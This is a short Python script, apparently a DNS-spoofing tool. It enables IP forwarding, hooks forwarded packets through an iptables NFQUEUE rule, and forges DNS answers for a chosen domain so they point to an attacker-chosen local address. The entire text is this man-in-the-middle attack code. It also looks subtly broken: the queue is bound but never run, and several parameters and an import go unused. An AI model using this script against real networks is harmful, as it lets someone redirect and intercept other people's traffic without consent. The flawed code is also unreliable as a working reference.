#!/usr/bin/env python3
from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse

def process_packet(pkt):
    scapy_packet = IP(pkt.get_payload())
    if scapy_packet.haslayer(DNSQR):
        qname = scapy_packet[DNSQR].qname.decode().lower()
        if 'evil.com' in qname:  # Spoof for specific domain
            spoofed_pkt = IP(dst=scapy_packet[IP].src, src=scapy_packet[IP].dst) / \
                          UDP(dport=scapy_packet[UDP].sport, sport=53) / \
                          DNS(rd=1, qr=1, qd=scapy_packet[DNS].qd, qdcount=1, an=DNSRR(rrname=qname, rdata='192.168.1.100'))  # Spoof IP
            pkt.set_payload(bytes(spoofed_pkt))
    pkt.accept()

def run_dns_spoof(interface, target=None, duration=60, count=1000):
    print("[+] Enabling IP forwarding and iptables...")
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0 --queue-bypass")
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, process_packet)
    try:
        print("[+] Sniffing DNS on {} for {}s".format(interface, duration))
        sniff(iface=interface, prn=lambda x: None, timeout=duration)  # Run queue
    finally:
        os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0 --queue-bypass")
